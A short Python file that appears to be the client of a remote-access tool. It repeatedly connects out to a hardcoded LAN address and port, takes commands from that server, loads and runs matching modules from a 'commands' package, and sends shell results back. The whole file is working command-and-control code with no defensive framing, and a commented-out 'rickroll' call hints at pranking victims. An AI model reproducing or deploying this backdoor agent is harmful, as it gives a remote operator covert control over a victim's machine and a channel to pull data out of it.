import importlib
import subprocess
import threading
import time
import webbrowser
import socket

from colorama import Fore, Style

# HOST = '127.0.0.1'
HOST = "192.168.1.92"
PORT = 5616




def main():
    # rickroll()
    socketStart()





def socketStart():
    while True:  # search for server
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                try:
                    s.connect((HOST, PORT))
                    print("Connected to server.")
                except ConnectionRefusedError:
                    print("Connection refused by server.")
                    time.sleep(1)
                    continue
                # listen for requests
                while True:  # while connected to server
                    data = s.recv(1024).decode('utf-8')
                    data = str(data)
                    if not data:
                        break
                    args = data.split(' ')
                    try:
                        command_module = importlib.import_module(f'commands.{args[0].upper()}')
                        command_module.execute(s, args)

                    except ImportError as e:
                        print(Fore.RED + f"Failed to import command module 'commands.{args[0].upper()}': {e}" + Style.RESET_ALL)
                        continue
        except socket.error as e:  # if server connection fails
            print("Connection error: {}".format(e))





def send_shell_results(s, results):
    try:
        data_to_send = results.encode("utf-8")
        # Send data in chunks
        for i in range(0, len(data_to_send), 1024):
            s.sendall(data_to_send[i:i + 1024]) # Send 1024 bytes at a time
        print("Sent results.")
    except BrokenPipeError:
        print("Connection closed by server.")
        return


if __name__ == "__main__":
    main()
